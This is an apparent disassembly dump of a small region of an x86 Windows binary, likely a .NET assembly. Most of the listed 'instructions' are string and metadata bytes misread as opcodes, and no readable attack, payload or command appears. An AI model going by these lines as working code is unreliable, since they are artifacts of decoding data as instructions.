  402dd6:	je     0x402e3d
  402dd8:	ins    DWORD PTR es:[edi],dx
  402dd9:	cs push edx
  402ddb:	jne    0x402e4b
  402ddd:	je     0x402e48
  402ddf:	ins    DWORD PTR es:[edi],dx
  402de0:	gs cs inc ebx
  402de3:	outs   dx,DWORD PTR ds:[esi]
  402de4:	ins    DWORD PTR es:[edi],dx
  402de5:	jo     0x402e50
  402de7:	ins    BYTE PTR es:[edi],dx
  402de8:	gs jb  0x402e3e
  402deb:	gs jb  0x402e64
  402dee:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402df5:	ins    DWORD PTR es:[edi],dx
  402df6:	jo     0x402e61
  402df8:	ins    BYTE PTR es:[edi],dx
  402df9:	popa   
  402dfa:	je     0x402e65
  402dfc:	outs   dx,DWORD PTR ds:[esi]
  402dfd:	outs   dx,BYTE PTR ds:[esi]
  402dfe:	push   edx
  402dff:	gs ins BYTE PTR es:[edi],dx
  402e01:	popa   
  402e02:	js     0x402e65
  402e04:	je     0x402e6f
  402e06:	outs   dx,DWORD PTR ds:[esi]
  402e07:	outs   dx,BYTE PTR ds:[esi]
  402e08:	jae    0x402e4b
  402e0a:	je     0x402e80
  402e0c:	jb     0x402e77
  402e0e:	bound  esi,QWORD PTR [ebp+0x74]
  402e11:	add    BYTE PTR gs:[edx+0x75],dl
  402e15:	outs   dx,BYTE PTR ds:[esi]
  402e16:	je     0x402e81
  402e18:	ins    DWORD PTR es:[edi],dx
  402e19:	gs inc ebx
  402e1b:	outs   dx,DWORD PTR ds:[esi]
  402e1c:	ins    DWORD PTR es:[edi],dx
  402e1d:	jo     0x402e80
  402e1f:	je     0x402e8a
  402e21:	bound  ebp,QWORD PTR [ecx+0x6c]
  402e24:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402e2c:	bound  esi,QWORD PTR [ebp+0x74]
  402e2f:	add    BYTE PTR gs:[ebx+0x54],dl
  402e33:	inc    ecx
  402e34:	push   esp
  402e35:	push   0x64616572
  402e3a:	inc    ecx
  402e3b:	je     0x402eb1
  402e3d:	jb     0x402ea8
  402e3f:	bound  esi,QWORD PTR [ebp+0x74]
  402e42:	add    BYTE PTR gs:[ebp+0x69],cl
  402e46:	arpl   WORD PTR [edx+0x6f],si
  402e49:	jae    0x402eba
  402e4b:	data16 je 0x402e7c
  402e4e:	dec    ebp
  402e4f:	popa   
  402e50:	jae    0x402eba
  402e52:	jne    0x402ec4
  402e54:	cs inc ebp
  402e56:	jbe    0x402eb9
  402e58:	ins    BYTE PTR es:[edi],dx
  402e59:	jne    0x402ebc
  402e5b:	je     0x402ecc
  402e5d:	jb     0x402e5f
  402e5f:	push   ebx
  402e60:	popa   
  402e61:	gs push sp
  402e64:	push   0x64616572
  402e69:	xor    al,BYTE PTR [eax]
  402e6b:	inc    ecx
  402e6c:	fs fs inc ebp
  402e6f:	js     0x402ed4
  402e71:	gs jo  0x402ee8
  402e74:	imul   ebp,DWORD PTR [edi+0x6e],0x646e6148
  402e7b:	ins    BYTE PTR es:[edi],dx
  402e7c:	gs jb  0x402e7f
  402e7f:	push   ebx
  402e80:	jns    0x402ef5
  402e82:	je     0x402ee9
  402e84:	ins    DWORD PTR es:[edi],dx
  402e85:	cs push esp
  402e87:	push   0x64616572
  402e8c:	imul   ebp,DWORD PTR [esi+0x67],0x72615000
  402e93:	popa   
  402e94:	ins    DWORD PTR es:[edi],dx
  402e95:	gs je  0x402efd
  402e98:	jb     0x402f03
  402e9a:	jp     0x402f01
  402e9c:	fs push esp
  402e9e:	push   0x64616572
  402ea3:	push   ebx
  402ea4:	je     0x402f07
  402ea6:	jb     0x402f1c
  402ea8:	add    BYTE PTR [ebx+0x72],al
  402eab:	gs popa 
  402ead:	je     0x402f14
  402eaf:	push   esp
  402eb0:	push   0x64616572
  402eb5:	push   ebx
  402eb6:	je     0x402f19
  402eb8:	jb     0x402f2e
  402eba:	add    BYTE PTR [ecx+0x6e],cl
  402ebd:	jbe    0x402f2e
  402ebf:	imul   esp,DWORD PTR [ebp+0x0],0x4d
  402ec3:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402eca:	je     0x402efa
  402ecc:	dec    ebp
  402ecd:	popa   
  402ece:	jae    0x402f38
  402ed0:	jne    0x402f42
  402ed2:	cs push esp
  402ed4:	jb     0x402f37
  402ed6:	arpl   WORD PTR [ecx+0x6e],bp
  402ed9:	add    BYTE PTR [si+0x72],dl
  402edd:	popa   
  402ede:	arpl   WORD PTR [ecx+0x6e],bp
  402ee1:	addr16 push ebx
  402ee3:	gs jb  0x402f5c
  402ee6:	imul   esp,DWORD PTR [ebx+0x65],0x736e4900
  402eed:	je     0x402f50
  402eef:	outs   dx,BYTE PTR ds:[esi]
  402ef0:	arpl   WORD PTR [ebp+0x0],sp
  402ef3:	inc    ebp
  402ef4:	jbe    0x402f57
  402ef6:	ins    BYTE PTR es:[edi],dx
  402ef7:	jne    0x402f5a
  402ef9:	je     0x402f6a
  402efb:	jb     0x402f51
  402efd:	jb     0x402f60
  402eff:	arpl   WORD PTR [ecx+0x6e],bp
  402f02:	add    BYTE PTR [di+0x69],cl
  402f06:	arpl   WORD PTR [edx+0x6f],si
  402f09:	jae    0x402f7a
  402f0b:	data16 je 0x402f3c
  402f0e:	dec    ebp
  402f0f:	popa   
  402f10:	jae    0x402f7a
  402f12:	jne    0x402f84
  402f14:	cs inc ebp
  402f16:	outs   dx,BYTE PTR ds:[esi]
  402f17:	imul   ebp,DWORD PTR [bp+0x65],0x746e492e
  402f1f:	gs jb  0x402f88
  402f22:	popa   
  402f23:	arpl   WORD PTR [ebp+0x2e],sp
  402f26:	push   esp
  402f27:	jb     0x402f8a
  402f29:	arpl   WORD PTR [ecx+0x6e],bp
  402f2c:	add    BYTE PTR [bx+di+0x54],cl
  402f30:	jb     0x402f93
  402f32:	arpl   WORD PTR [ecx+0x6e],bp
  402f35:	addr16 push ebx
  402f37:	gs jb  0x402fb0
  402f3a:	imul   esp,DWORD PTR [ebx+0x65],0x72655300
  402f41:	jbe    0x402fac
  402f43:	arpl   WORD PTR [ebp+0x0],sp
  402f46:	push   ebx
  402f47:	je     0x402fbb
  402f49:	imul   ebp,DWORD PTR [esi+0x67],0x6d6f4300
  402f50:	jo     0x402fb3
  402f52:	jb     0x402fb9
  402f54:	dec    edi
  402f55:	jb     0x402fbb
  402f57:	imul   ebp,DWORD PTR [esi+0x61],0x6544006c
  402f5e:	bound  esi,QWORD PTR [ebp+0x67]
  402f61:	addr16 gs jb 0x402f65
  402f65:	dec    esp
  402f66:	popa   
  402f67:	jne    0x402fd7
  402f69:	arpl   WORD PTR [eax+0x0],bp
  402f6c:	addr16 gs je 0x402fcf
  402f70:	dec    eax
  402f71:	popa   
  402f72:	jae    0x402fca
  402f74:	popa   
  402f75:	ins    BYTE PTR es:[edi],dx
  402f76:	jne    0x402fdd
  402f78:	add    BYTE PTR [edi+0x65],ah
  402f7b:	je     0x402fdc
  402f7d:	dec    ecx
  402f7e:	outs   dx,BYTE PTR ds:[esi]
  402f7f:	jbe    0x402fe2
  402f81:	jb     0x402fec
  402f83:	popa   
  402f84:	outs   dx,BYTE PTR ds:[esi]
  402f85:	je     0x402fca
  402f87:	jne    0x402ff5
  402f89:	je     0x403000
  402f8b:	jb     0x402ff2
  402f8d:	add    BYTE PTR [ecx+0x6e],cl
  402f90:	je     0x402fc5
  402f92:	xor    al,BYTE PTR [eax]
  402f94:	dec    ecx
  402f95:	inc    esi
  402f96:	outs   dx,DWORD PTR ds:[esi]
  402f97:	jb     0x403006
  402f99:	popa   
  402f9a:	je     0x402fec
  402f9c:	jb     0x40300d
  402f9e:	jbe    0x403009
  402fa0:	fs gs jb 0x402fa4
  402fa4:	push   eax
  402fa5:	popa   
  402fa6:	jb     0x40301b
  402fa8:	add    BYTE PTR gs:[ecx+0x6e],cl
  402fac:	jbe    0x40300f
  402fae:	ins    BYTE PTR es:[edi],dx
  402faf:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  402fb7:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  402fbe:	jo     0x403034
  402fc0:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  402fc7:	je     0x40302e
  402fc9:	ins    DWORD PTR es:[edi],dx
  402fca:	cs inc ebx
  402fcc:	outs   dx,DWORD PTR ds:[esi]
  402fcd:	jb     0x403034
  402fcf:	add    BYTE PTR [ebx+0x79],dl
  402fd2:	jae    0x403048
  402fd4:	gs ins DWORD PTR es:[edi],dx
  402fd6:	cs dec ecx
  402fd8:	dec    edi
  402fd9:	cs push eax
  402fdb:	imul   esi,DWORD PTR [eax+0x65],0x6e410073
  402fe2:	outs   dx,DWORD PTR ds:[esi]
  402fe3:	outs   dx,BYTE PTR ds:[esi]
  402fe4:	jns    0x403053
  402fe6:	outs   dx,DWORD PTR ds:[esi]
  402fe7:	jne    0x40305c
  402fe9:	push   eax
  402fea:	imul   esi,DWORD PTR [eax+0x65],0x65696c43
  402ff1:	outs   dx,BYTE PTR ds:[esi]
  402ff2:	je     0x403047
  402ff4:	je     0x403068
  402ff6:	gs popa 
  402ff8:	ins    DWORD PTR es:[edi],dx
  402ff9:	add    BYTE PTR [eax+0x69],dl
  402ffc:	jo     0x403063
  402ffe:	inc    esp
  402fff:	imul   esi,DWORD PTR [edx+0x65],0x6f697463
  403006:	outs   dx,BYTE PTR ds:[esi]
  403007:	add    BYTE PTR [ebx+0x6c],al
  40300a:	imul   esp,DWORD PTR [ebp+0x6e],0x70695074
  403011:	gs jae 0x403055
  403014:	je     0x40308a
  403016:	popa   
  403017:	arpl   WORD PTR [eax+0x65],bp
  40301a:	fs inc ebp
  40301c:	jbe    0x403083
  40301e:	outs   dx,BYTE PTR ds:[esi]
  40301f:	je     0x403021
  403021:	push   ebx
  403022:	gs je  0x403025
  403025:	push   esp
  403026:	push   0x64616572
  40302b:	add    BYTE PTR [ebx+0x65],dh
  40302e:	je     0x40308f
  403030:	dec    ecx
  403031:	jae    0x403075
  403033:	popa   
  403034:	arpl   WORD PTR [ebx+0x67],bp
  403037:	jb     0x4030a8
  403039:	jne    0x4030a9
  40303b:	add    BYTE PTR fs:[ebx+0x74],dl
  40303f:	popa   
  403040:	jb     0x4030b6
  403042:	add    BYTE PTR [edi+0x65],ah
  403045:	je     0x4030a6
  403047:	push   esi
  403048:	popa   
  403049:	ins    BYTE PTR es:[edi],dx
  40304a:	jne    0x4030b1
  40304c:	add    BYTE PTR [ebp+0x76],al
  40304f:	popa   
  403050:	ins    BYTE PTR es:[edi],dx
  403051:	jne    0x4030b4
  403053:	je     0x4030be
  403055:	outs   dx,DWORD PTR ds:[esi]
  403056:	outs   dx,BYTE PTR ds:[esi]
  403057:	dec    eax
  403058:	outs   dx,DWORD PTR ds:[esi]
  403059:	jae    0x4030cf
  40305b:	add    BYTE PTR [ebx+0x79],dl
  40305e:	jae    0x4030d4
  403060:	gs ins DWORD PTR es:[edi],dx
  403062:	cs dec ecx
  403064:	dec    edi
  403065:	add    BYTE PTR [ebx+0x74],dl
  403068:	jb     0x4030cf
  40306a:	popa   
  40306b:	ins    DWORD PTR es:[edi],dx
  40306c:	add    BYTE PTR [ebp+0x75],cl
  40306f:	je     0x4030d6
  403071:	js     0x403073
  403073:	dec    edi
  403074:	jo     0x4030db
  403076:	outs   dx,BYTE PTR ds:[esi]
  403077:	inc    ebp
  403078:	js     0x4030e3
  40307a:	jae    0x4030f0
  40307c:	imul   ebp,DWORD PTR [esi+0x67],0x61725400
  403083:	arpl   WORD PTR [ebp+0x0],sp
  403086:	inc    esi
  403087:	ins    BYTE PTR es:[edi],dx
  403088:	jne    0x4030fd
  40308a:	push   0x69615700
  40308f:	je     0x4030d9
  403091:	popa   
  403092:	outs   dx,BYTE PTR ds:[esi]
  403093:	fs ins BYTE PTR es:[edi],dx
  403095:	add    BYTE PTR gs:[edi+0x61],dl
  403099:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x65520065
  4030a1:	ins    BYTE PTR es:[edi],dx
  4030a2:	gs popa 
  4030a4:	jae    0x40310b
  4030a6:	dec    ebp
  4030a7:	jne    0x40311d
  4030a9:	gs js  0x4030ac
  4030ac:	inc    ebx
  4030ad:	ins    BYTE PTR es:[edi],dx
  4030ae:	outs   dx,DWORD PTR ds:[esi]
  4030af:	jae    0x403116
  4030b1:	add    BYTE PTR [ebp+0x6e],al
  4030b4:	jbe    0x40311f
  4030b6:	jb     0x403127
  4030b8:	outs   dx,BYTE PTR ds:[esi]
  4030b9:	ins    DWORD PTR es:[edi],dx
  4030ba:	outs   dx,BYTE PTR gs:[esi]
  4030bc:	je     0x4030be
  4030be:	inc    ebp
  4030bf:	js     0x40312a
  4030c1:	je     0x4030c3
  4030c3:	dec    edi
  4030c4:	jne    0x40313a
  4030c6:	dec    edi
  4030c7:	dec    bp
  4030c9:	gs ins DWORD PTR es:[edi],dx
  4030cb:	outs   dx,DWORD PTR ds:[esi]
  4030cc:	jb     0x403147
  4030ce:	inc    ebp
  4030cf:	js     0x403134
  4030d1:	gs jo  0x403148
  4030d4:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  4030db:	je     0x403142
  4030dd:	ins    DWORD PTR es:[edi],dx
  4030de:	cs push edx
  4030e0:	jne    0x403150
  4030e2:	je     0x40314d
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	gs cs dec ecx
  4030e8:	outs   dx,BYTE PTR ds:[esi]
  4030e9:	je     0x403150
  4030eb:	jb     0x40315c
  4030ed:	jo     0x403142
  4030ef:	gs jb  0x403168
  4030f2:	imul   esp,DWORD PTR [ebx+0x65],0x72450073
  4030f9:	jb     0x40316a
  4030fb:	jb     0x403154
  4030fd:	jb     0x403160
  4030ff:	jo     0x403171
  403101:	gs jb  0x403104
  403104:	addr16 gs je 0x403167
  403108:	inc    ebp
  403109:	jb     0x40317d
  40310b:	outs   dx,DWORD PTR ds:[esi]
  40310c:	jb     0x403151
  40310e:	outs   dx,DWORD PTR ds:[esi]
  40310f:	fs add BYTE PTR gs:[ecx+0x48],cl
  403114:	outs   dx,DWORD PTR ds:[esi]
  403115:	jae    0x40318b
  403117:	push   esp
  403118:	jb     0x40317b
  40311a:	arpl   WORD PTR [ebp+0x0],sp
  40311d:	dec    ebp
  40311e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403125:	je     0x403155
  403127:	dec    ebp
  403128:	popa   
  403129:	jae    0x403193
  40312b:	jne    0x40319d
  40312d:	cs inc ebp
  40312f:	outs   dx,BYTE PTR ds:[esi]
  403130:	imul   ebp,DWORD PTR [bp+0x65],0x746e492e
  403138:	gs jb  0x4031a1
  40313b:	popa   
  40313c:	arpl   WORD PTR [ebp+0x0],sp
  40313f:	dec    ecx
  403140:	inc    ebp
  403141:	outs   dx,BYTE PTR ds:[esi]
  403142:	imul   ebp,DWORD PTR [bp+0x65],0x74736f48
  40314a:	add    BYTE PTR [edx+esi*2+0x61],dl
  40314e:	arpl   WORD PTR [ebp+0x45],sp
  403151:	jbe    0x4031b8
  403153:	outs   dx,BYTE PTR ds:[esi]
  403154:	je     0x4031aa
  403156:	jns    0x4031c8
  403158:	add    BYTE PTR gs:[ebx+0x72],al
  40315c:	gs popa 
  40315e:	je     0x4031c5
  403160:	push   esp
  403161:	jb     0x4031c4
  403163:	arpl   WORD PTR [ebp+0x0],sp
  403166:	inc    ecx
  403167:	fs add BYTE PTR fs:[ecx+0x44],cl
  40316c:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  403173:	ins    BYTE PTR es:[edi],dx
  403174:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  403179:	jo     0x4031ea
  40317b:	jae    0x4031e2
  40317d:	add    BYTE PTR [ebp+0x69],cl
  403180:	arpl   WORD PTR [edx+0x6f],si
  403183:	jae    0x4031f4
  403185:	data16 je 0x4031b6
  403188:	dec    ebp
  403189:	popa   
  40318a:	jae    0x4031f4
  40318c:	jne    0x4031fe
  40318e:	cs inc ebx
  403190:	outs   dx,DWORD PTR ds:[esi]
  403191:	ins    DWORD PTR es:[edi],dx
  403192:	ins    DWORD PTR es:[edi],dx
  403193:	outs   dx,DWORD PTR ds:[esi]
  403194:	outs   dx,BYTE PTR ds:[esi]
  403195:	add    BYTE PTR [edi+0x69],dl
  403198:	outs   dx,BYTE PTR ds:[esi]
  403199:	outs   dx,DWORD PTR fs:[esi]
  40319b:	ja     0x403210
  40319d:	push   esi
  40319e:	gs jb  0x403214
  4031a1:	imul   ebp,DWORD PTR [edi+0x6e],0x72655600
  4031a8:	jae    0x403213
  4031aa:	outs   dx,DWORD PTR ds:[esi]
  4031ab:	outs   dx,BYTE PTR ds:[esi]
  4031ac:	add    BYTE PTR [edi+0x69],dl
  4031af:	outs   dx,BYTE PTR ds:[esi]
  4031b0:	outs   dx,DWORD PTR fs:[esi]
  4031b2:	ja     0x403227
  4031b4:	cmp    BYTE PTR [eax],al
  4031b6:	dec    ecx
  4031b7:	jae    0x4031fa
  4031b9:	je     0x403207
  4031bb:	gs popa 
  4031bd:	jae    0x403233
  4031bf:	add    BYTE PTR [esi+0x6c],al
  4031c2:	popa   
  4031c3:	addr16 jae 0x403207
  4031c6:	je     0x40323c
  4031c8:	jb     0x403233
  4031ca:	bound  esi,QWORD PTR [ebp+0x74]
  4031cd:	add    BYTE PTR gs:[esp+ebp*2+0x6c],al
  4031d2:	dec    ecx
  4031d3:	ins    DWORD PTR es:[edi],dx
  4031d4:	jo     0x403245
  4031d6:	jb     0x40324c
  4031d8:	inc    ecx
  4031d9:	je     0x40324f
  4031db:	jb     0x403246
  4031dd:	bound  esi,QWORD PTR [ebp+0x74]
  4031e0:	add    BYTE PTR gs:[ebx+0x65],ch
  4031e4:	jb     0x403254
  4031e6:	gs ins BYTE PTR es:[edi],dx
  4031e8:	xor    esi,DWORD PTR [edx]
  4031ea:	cs fs ins BYTE PTR es:[edi],dx
  4031ed:	ins    BYTE PTR es:[edi],dx
  4031ee:	add    BYTE PTR [ecx+eiz*2+0x74],al
  4031f2:	gs push esp
  4031f4:	imul   ebp,DWORD PTR [ebp+0x65],0x72615000
  4031fb:	jae    0x403262
  4031fd:	inc    ebp
  4031fe:	js     0x403261
  403200:	arpl   WORD PTR [eax+eax*1+0x54],si
  403204:	outs   dx,DWORD PTR ds:[esi]
  403205:	push   ebx
  403206:	je     0x40327a
  403208:	imul   ebp,DWORD PTR [esi+0x67],0x2f0d0000
  40320f:	add    BYTE PTR [eax+eax*1+0x65],ah
  403213:	add    BYTE PTR [edx+0x0],ah
  403216:	jne    0x403218
  403218:	add    BYTE PTR [bx+si],al
  40321b:	jno    0x403262
  40321d:	add    BYTE PTR [esi+0x0],dh
  403220:	popa   
  403221:	add    BYTE PTR [eax+eax*1+0x75],ch
  403225:	add    BYTE PTR [ecx+0x0],ah
  403228:	je     0x40322a
  40322a:	imul   eax,DWORD PTR [eax],0x6e006f
  403230:	inc    ebx
  403231:	add    BYTE PTR [edi+0x0],ch
  403234:	outs   dx,BYTE PTR ds:[esi]
  403235:	add    BYTE PTR [eax+eax*1+0x61],dh
  403239:	add    BYTE PTR [ecx+0x0],ch
  40323c:	outs   dx,BYTE PTR ds:[esi]
  40323d:	add    BYTE PTR [ebp+0x0],ah
  403240:	jb     0x403242
  403242:	dec    ebp
  403243:	add    BYTE PTR [ecx+0x0],ah
  403246:	imul   eax,DWORD PTR [eax],0x2f006e
  40324c:	inc    ebp
  40324d:	add    BYTE PTR [eax+0x0],bh
  403250:	arpl   WORD PTR [eax],ax
  403252:	add    BYTE PTR gs:[eax+0x0],dh
  403256:	je     0x403258
  403258:	imul   eax,DWORD PTR [eax],0x6e006f
  40325e:	dec    eax
  40325f:	add    BYTE PTR [ecx+0x0],ah
  403262:	outs   dx,BYTE PTR ds:[esi]
  403263:	add    BYTE PTR [eax+eax*1+0x6c],ah
  403267:	add    BYTE PTR [ebp+0x0],ah
  40326a:	jb     0x40326c
  40326c:	das    
  40326d:	add    BYTE PTR [eax+0x0],cl
  403270:	popa   
  403271:	add    BYTE PTR [esi+0x0],ch
  403274:	add    BYTE PTR fs:[eax+eax*1+0x65],ch
  403279:	add    BYTE PTR [ebp+0x0],al
  40327c:	js     0x40327e
  40327e:	arpl   WORD PTR [eax],ax
  403280:	add    BYTE PTR gs:[eax+0x0],dh
  403284:	je     0x403286
  403286:	imul   eax,DWORD PTR [eax],0x6e006f
  40328c:	add    BYTE PTR [edi],dl
  40328e:	arpl   WORD PTR [eax],ax
  403290:	outs   dx,DWORD PTR ds:[esi]
  403291:	add    BYTE PTR [esi+0x0],ch
  403294:	je     0x403296
  403296:	popa   
  403297:	add    BYTE PTR [ecx+0x0],ch
  40329a:	outs   dx,BYTE PTR ds:[esi]
  40329b:	add    BYTE PTR [ebp+0x0],ah
  40329e:	jb     0x4032a0
  4032a0:	dec    ecx
  4032a1:	add    BYTE PTR [eax+eax*1+0x0],al
  4032a5:	adc    DWORD PTR [edi],esi
  4032a7:	add    BYTE PTR [edi],ch
  4032a9:	add    BYTE PTR ds:0x32002f00,dh
  4032af:	add    BYTE PTR [eax],dh
  4032b1:	add    BYTE PTR [ecx],dh
  4032b3:	add    BYTE PTR [edi],dh
  4032b5:	add    BYTE PTR [eax],al
  4032b7:	adc    DWORD PTR [ebp+0x0],ecx
  4032ba:	das    
  4032bb:	add    BYTE PTR [eax+eax*1+0x2f],ah
  4032bf:	add    BYTE PTR [ecx+0x0],bh
  4032c2:	jns    0x4032c4
  4032c4:	jns    0x4032c6
  4032c6:	jns    0x4032c8
  4032c8:	add    BYTE PTR [ebx],cl
  4032ca:	add    BYTE PTR gs:[esi+0x0],ch
  4032ce:	sub    eax,0x53005500
  4032d3:	add    BYTE PTR [ecx],al
  4032d5:	add    ebx,DWORD PTR [ecx+0x0]
  4032d8:	add    BYTE PTR [eax],al
  4032da:	add    BYTE PTR [eax],al
  4032dc:	push   0xf5fb07c0
  4032e1:	test   eax,0x498a4cc1
  4032e6:	daa    
  4032e7:	inc    eax
  4032e8:	cld    
  4032e9:	(bad)  
  4032eb:	lods   eax,DWORD PTR ds:[esi]
  4032ec:	add    BYTE PTR [eax],cl
  4032ee:	mov    bh,0x7a
  4032f0:	pop    esp
  4032f1:	push   esi
  4032f2:	sbb    DWORD PTR [eax+eiz*8],esi
  4032f5:	mov    DWORD PTR [eax],ecx
  4032f7:	xor    DWORD PTR [edi+0x36ad5638],edi
  4032fd:	dec    esi
  4032fe:	xor    eax,0x4a0e0602
  403303:	dec    ebp
  403304:	add    BYTE PTR [ecx+0x0],ch
  403307:	arpl   WORD PTR [eax],ax
  403309:	jb     0x40330b
  40330b:	outs   dx,DWORD PTR ds:[esi]
  40330c:	add    BYTE PTR [ebx+0x0],dh
  40330f:	outs   dx,DWORD PTR ds:[esi]
  403310:	add    BYTE PTR [esi+0x0],ah
  403313:	je     0x403315
  403315:	and    BYTE PTR [eax],al
  403317:	dec    ebp
  403318:	add    BYTE PTR [ecx+0x0],ah
  40331b:	jae    0x40331d
  40331d:	push   0x70007500
  403322:	add    BYTE PTR [eax],ah
  403324:	add    BYTE PTR [ebp+0x0],al
  403327:	jbe    0x403329
  403329:	popa   
  40332a:	add    BYTE PTR [eax+eax*1+0x75],ch
  40332e:	add    BYTE PTR [ecx+0x0],ah
  403331:	je     0x403333
  403333:	imul   eax,DWORD PTR [eax],0x6e006f
  403339:	and    BYTE PTR [eax],al
  40333b:	inc    ebx
  40333c:	add    BYTE PTR [edi+0x0],ch
  40333f:	outs   dx,BYTE PTR ds:[esi]
  403340:	add    BYTE PTR [eax+eax*1+0x61],dh
  403344:	add    BYTE PTR [ecx+0x0],ch
  403347:	outs   dx,BYTE PTR ds:[esi]
  403348:	add    BYTE PTR [ebp+0x0],ah
  40334b:	jb     0x40334d
  40334d:	push   es
  40334e:	push   es
  40334f:	adc    eax,0x8011111
  403354:	add    eax,0x1d080100
  403359:	push   cs
  40335a:	add    eax,0x1d080120
  40335f:	push   cs
  403360:	add    al,0x20
  403362:	add    DWORD PTR [ecx],eax
  403364:	sbb    al,0x3
  403366:	and    BYTE PTR [eax],al
  403368:	add    DWORD PTR [ebx],eax
  40336a:	push   es
  40336b:	adc    cl,BYTE PTR [eax*1+0x12010120]
  403372:	or     al,0x5
  403374:	and    BYTE PTR [ecx],al
  403376:	add    dl,BYTE PTR [edx]
  403378:	adc    eax,0x1000003
  40337d:	add    al,BYTE PTR [esi]
  40337f:	or     DWORD PTR [ebx],eax
  403381:	push   es
  403382:	adc    DWORD PTR [eax],ebx
  403384:	add    al,0x0
  403386:	add    BYTE PTR [eax],al
  403388:	add    BYTE PTR [ecx+eax*1],al
  40338b:	add    BYTE PTR [eax],al
  40338d:	add    BYTE PTR [edx+eax*1],al
  403390:	add    BYTE PTR [eax],al
  403392:	add    BYTE PTR [esp+eax*1],al
  403395:	add    BYTE PTR [eax],al
  403397:	add    BYTE PTR [eax+ecx*1],al
  40339a:	add    BYTE PTR [eax],al
  40339c:	add    BYTE PTR [eax+edx*1],al
  40339f:	add    BYTE PTR [eax],al
  4033a1:	add    BYTE PTR [eax+eiz*1],al
  4033a4:	add    BYTE PTR [eax],al
  4033a6:	add    BYTE PTR [eax+eax*1],al
  4033a9:	add    DWORD PTR [ecx],eax
  4033ab:	or     DWORD PTR [edx+0x20002c98],eax
  4033b1:	add    BYTE PTR [eax+0x0],dl
  4033b4:	jne    0x4033b6
  4033b6:	bound  eax,QWORD PTR [eax]
  4033b8:	ins    BYTE PTR es:[edi],dx
  4033b9:	add    BYTE PTR [ecx+0x0],ch
  4033bc:	arpl   WORD PTR [eax],ax
  4033be:	dec    ebx
  4033bf:	add    BYTE PTR [ebp+0x0],ah
  4033c2:	jns    0x4033c4
  4033c4:	cmp    eax,0x30003000
  4033c9:	add    BYTE PTR [edx],dh
  4033cb:	add    BYTE PTR [eax+eax*1],dh
  4033ce:	xor    BYTE PTR [eax],al
  4033d0:	xor    BYTE PTR [eax],al
  4033d2:	xor    BYTE PTR [eax],al
  4033d4:	xor    BYTE PTR [eax],al
  4033d6:	xor    BYTE PTR [eax],al
  4033d8:	xor    al,0x0
  4033da:	cmp    BYTE PTR [eax],al
  4033dc:	xor    BYTE PTR [eax],al
  4033de:	xor    BYTE PTR [eax],al
  4033e0:	xor    BYTE PTR [eax],al
  4033e2:	xor    BYTE PTR [eax],al
  4033e4:	xor    BYTE PTR [eax],al
  4033e6:	cmp    DWORD PTR [eax],eax
  4033e8:	xor    al,0x0
  4033ea:	xor    BYTE PTR [eax],al
  4033ec:	xor    BYTE PTR [eax],al
  4033ee:	xor    BYTE PTR [eax],al
  4033f0:	xor    BYTE PTR [eax],al
  4033f2:	xor    BYTE PTR [eax],al
  4033f4:	xor    BYTE PTR [eax],al
  4033f6:	xor    BYTE PTR [eax],al
  4033f8:	add    BYTE PTR ss:[eax],dh
  4033fb:	add    BYTE PTR [edx],dh
  4033fd:	add    BYTE PTR [eax],dh
  4033ff:	add    BYTE PTR [eax],dh
  403401:	add    BYTE PTR [eax],dh
  403403:	add    BYTE PTR [eax],dh
  403405:	add    BYTE PTR [eax],dh
  403407:	add    BYTE PTR [eax],dh
  403409:	add    BYTE PTR [edx],dh
  40340b:	add    BYTE PTR [eax+eax*1],dh
  40340e:	xor    BYTE PTR [eax],al
  403410:	xor    BYTE PTR [eax],al
  403412:	xor    BYTE PTR [eax],al
  403414:	xor    BYTE PTR [eax],al
  403416:	xor    eax,0x35003200
  40341b:	add    BYTE PTR [ebx],dh
  40341d:	add    BYTE PTR [eax+eax*1],dh
  403420:	xor    DWORD PTR [eax],eax
  403422:	xor    eax,DWORD PTR [eax]
  403424:	xor    DWORD PTR [eax],eax
  403426:	xor    BYTE PTR [eax],al
  403428:	xor    BYTE PTR [eax],al
  40342a:	xor    BYTE PTR [eax],al
  40342c:	xor    al,0x0
  40342e:	xor    BYTE PTR [eax],al
  403430:	xor    BYTE PTR [eax],al
  403432:	xor    BYTE PTR [eax],al
  403434:	xor    BYTE PTR [eax],al
  403436:	xor    BYTE PTR [eax],al
  403438:	xor    DWORD PTR [eax],eax
  40343a:	xor    BYTE PTR [eax],al
  40343c:	xor    BYTE PTR [eax],al
  40343e:	xor    BYTE PTR [eax],al
  403440:	xor    DWORD PTR [eax],eax
  403442:	xor    BYTE PTR [eax],al
  403444:	xor    BYTE PTR [eax],al
  403446:	bound  eax,QWORD PTR [eax]
  403448:	xor    eax,0x63006600
  40344d:	add    BYTE PTR [ecx],bh
  40344f:	add    BYTE PTR [eax],dh
  403451:	add    BYTE PTR [ebp+0x0],ah
  403454:	aaa    
  403455:	add    BYTE PTR [eax],dh
  403457:	add    BYTE PTR [edx],dh
  403459:	add    BYTE PTR [edi],dh
  40345b:	add    BYTE PTR [esi+0x0],ah
  40345e:	add    BYTE PTR ss:[edi],dh
  403461:	add    BYTE PTR [eax],bh
  403463:	add    BYTE PTR [edi],dh
  403465:	add    BYTE PTR [ecx],dh
  403467:	add    BYTE PTR [ebp+0x0],ah
  40346a:	aaa    
  40346b:	add    BYTE PTR [edi],dh
  40346d:	add    BYTE PTR [ebx],dh
  40346f:	add    BYTE PTR [ecx+0x0],ah
  403472:	cmp    BYTE PTR [eax],al
  403474:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  403479:	add    BYTE PTR [eax],bh
  40347b:	add    BYTE PTR [ecx],bh
  40347d:	add    BYTE PTR [ebx],dh
  40347f:	add    BYTE PTR [eax],bh
  403481:	add    BYTE PTR [ebx+0x0],ah
  403484:	cmp    BYTE PTR [eax],al
  403486:	xor    DWORD PTR [eax],eax
  403488:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  40348d:	add    BYTE PTR [eax],dh
